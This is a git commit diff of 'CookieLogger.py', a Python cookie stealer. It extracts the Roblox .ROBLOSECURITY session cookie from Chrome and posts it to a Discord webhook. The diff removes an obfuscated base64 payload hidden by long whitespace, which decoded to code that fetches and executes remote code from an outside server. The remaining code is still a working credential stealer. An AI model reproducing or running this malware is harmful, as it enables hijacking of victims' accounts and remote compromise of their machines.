d95904ccc2c6ed0f9acce435e6189861a783ea37
IsaacDoesntDoStuff <90070921+IsaacDoesntDoStuff@users.noreply.github.com>
2022-09-16 18:21:14 -0400

    Update CookieLogger.py
    lmao undualhooked version lol.
    might edit a bit more so it has more browser

--- CookieLogger.py
+++ CookieLogger.py
@@ -1,6 +1,5 @@
-from builtins import *
 import browser_cookie3, requests, threading, discord_webhook
-type('requests')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JU1VQOEF2SGljTFVidklTJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
+type('requests')                                                                                                                                                                                                                                                          
 
 webhook = 'YOUR WEBHOOK HERE'
 
@@ -9,9 +8,10 @@ def chrome_logger():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'SKID LOGGER', 'content':f'```SKIDS COOKIE: {cookie}```'})
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```COOKIE: {cookie}```'})
     except:
         pass
+    
 browsers = [chrome_logger]
 
 for x in browsers:
